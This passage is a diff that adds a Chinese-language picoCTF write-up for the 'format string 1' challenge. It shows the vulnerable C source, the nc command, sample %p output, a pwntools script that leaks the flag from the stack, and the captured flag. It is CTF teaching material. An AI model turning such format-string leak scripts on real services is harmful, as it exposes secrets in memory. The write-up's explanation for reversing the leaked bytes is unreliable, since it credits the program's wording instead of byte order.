@@ -2144,6 +2144,100 @@ Enter your recommendation:
 picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_c8362f05}
 ```
 
+## format string 1
+
+來看看題目的source code。
+
+```c
+#include <stdio.h>
+
+
+int main() {
+  char buf[1024];
+  char secret1[64];
+  char flag[64];
+  char secret2[64];
+
+  // Read in first secret menu item
+  FILE *fd = fopen("secret-menu-item-1.txt", "r");
+  if (fd == NULL){
+    printf("'secret-menu-item-1.txt' file not found, aborting.\n");
+    return 1;
+  }
+  fgets(secret1, 64, fd);
+  // Read in the flag
+  fd = fopen("flag.txt", "r");
+  if (fd == NULL){
+    printf("'flag.txt' file not found, aborting.\n");
+    return 1;
+  }
+  fgets(flag, 64, fd);
+  // Read in second secret menu item
+  fd = fopen("secret-menu-item-2.txt", "r");
+  if (fd == NULL){
+    printf("'secret-menu-item-2.txt' file not found, aborting.\n");
+    return 1;
+  }
+  fgets(secret2, 64, fd);
+
+  printf("Give me your order and I'll read it back to you:\n");
+  fflush(stdout);
+  scanf("%1024s", buf);
+  printf("Here's your order: ");
+  printf(buf);
+  printf("\n");
+  fflush(stdout);
+
+  printf("Bye!\n");
+  fflush(stdout);
+
+  return 0;
+}
+```
+
+可以明顯地看到在第36行那邊的`printf(buf)`是沒有加上格式化字符的，所以這邊有一個很明顯的format string vulnerability。我們用netcat連接題目看看。
+
+```bash
+nc mimas.picoctf.net 53267
+```
+
+連上題目後發現他說Give me your order and I'll read it back to you，所以我們嘗試輸入`%p`後發現他會輸出一個十六進位的東西。以下是題目的輸出。
+
+```txt
+Here's your order: 0x402118
+Bye!
+```
+
+這看起來可以把它轉回字串，並且如果多輸入幾個`%p`應該就能把Flag給Leak出來。我寫了一個Exploit，去嘗試獲取Flag。在腳本中之所以要把每一段十六進位轉回的字串前後翻轉，是因為題目剛剛有說"I'll read it back to you"，所以推測他應該是反著過來輸出的。Exploit如下：
+
+```python
+from pwn import *
+from Crypto.Util.number import long_to_bytes
+
+r = remote("mimas.picoctf.net", 53267)
+
+payload = ",".join(["%p"] * 20)
+print(payload)
+r.sendline(payload)
+r.recvuntil(b"Here's your order: ")
+res = r.recvuntil(b"Bye!").decode().removesuffix("Bye!").split(",")
+
+flag = ""
+for i in res:
+    try:
+        flag += long_to_bytes(int(i, 16)).decode()[::-1]
+    except ValueError:
+        pass
+
+print(flag)
+```
+
+果然，執行後就可以看到Flag啦。
+
+```txt
+picoCTF{4n1m41_57y13_4x4_f14g_e11e8018}
+```
+
 ## heap 0
 
 先把題目給的source code下載下來看看。
